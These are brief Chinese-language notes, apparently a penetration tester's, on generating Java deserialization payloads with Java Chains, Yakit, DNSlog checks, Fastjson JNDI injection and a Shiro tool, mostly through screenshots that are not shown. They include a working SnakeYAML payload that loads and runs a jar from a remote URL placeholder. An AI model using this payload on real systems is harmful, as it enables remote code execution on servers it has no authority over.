## Java Chains  生成java payload  readobject

要用java8

```
java -jar ~/Desktop/java-chains-1.4.1.jar
```

注意生成的账号和密码  

![image-20260215125840070](images/image-20260215125840070.png)

用来生成反序列化链

![image-20260215144047626](images/image-20260215144047626.png)

## yakit 生成反序列化链   readobject

### 1 

![image-20260215144354480](images/image-20260215144354480.png)

### 2 DNSlog

生成可用域名

![image-20260215144801742](images/image-20260215144801742.png)

![image-20260215144823248](images/image-20260215144823248.png)

通过回显看是否成功

![image-20260215144914611](images/image-20260215144914611.png)

### SnakeYAML 反序列化

![image-20260215151238754](images/image-20260215151238754.png)

```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://XXXXXXX替换远程加载的文件yaml-payload.jar']]]]
```

### Fastjson 用  JNDI-Injection-Exploit-1.0-SNAPSHOT-all

![image-20260215161839600](images/image-20260215161839600.png)

![image-20260215161824723](images/image-20260215161824723.png)

### Fastjson

![image-20260215155653768](images/image-20260215155653768.png)

![image-20260215155732056](images/image-20260215155732056.png)

### Shiro 反序列化 直接用工具

![image-20260215174018546](images/image-20260215174018546.png)